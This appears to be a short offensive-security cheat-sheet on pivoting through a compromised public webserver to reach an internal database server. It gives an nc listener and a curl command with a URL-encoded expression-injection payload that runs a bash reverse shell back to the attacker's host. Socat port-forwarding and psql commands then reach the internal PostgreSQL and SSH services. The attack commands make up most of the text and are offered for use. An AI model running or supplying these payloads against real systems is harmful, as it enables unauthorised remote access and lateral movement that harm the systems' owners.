## Table of contents
- [Simple Port Forwading](#Simple-Port-Forwading)

# Simple Port Forwading

Scenario:
 - external attacker machine
 - vulnerable public webserver (RCE)
 - internal database server, same sebserver's network

+- WAN ------------+    +- DMZ -------------------------------+\n
|                  |    |                                     |\n
|   [ ATTACKER ]   |    |   [ VULN-PUBLIC-SRV ]  [ DB-SRV ]   |\n
|                  |    |                                     |\n
+------------------+    +-------------------------------------+\n

``` bash
# open a listener on the attacker machine
nc -nvlp 1337

# exploit the webserver with a reverse shell command
curl http://$TARGET:$PORT/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/$ATTACKER/$PORT%200%3E%261%27%29.start%28%29%22%29%7D/

# check the network configuration
# search for interesting information: webapp configuration, db credentials, ...
ip add
ip route
```

Port forwarding with socat:
 - the NAT configuration must be 1:1
 - socat must be installed on the target machine

+- WAN ------------+    +- DMZ -------------------------------+
|                  |    |                                     |
|   [ ATTACKER ]   |    |   [ VULN_PUBLIC_SRV ]  [ DB_SRV ]   |
|                ========== LISTEN 2345 ======== FRW 5432     | ==> for PgSQL
|                ========== LISTEN 2222 ======== FRW 22       | ==> for SSH
+------------------+    +-------------------------------------+

``` bash
socat -add TCP-LISTEN:2345,fork TCP:$DB_SRV:5432
```

Connect to DB_SRV from ATTACKER via VULN_PUBLIC_SRV:
``` bash
psql -h VULN_PUBLIC_SRV -p 2345 -U $user
```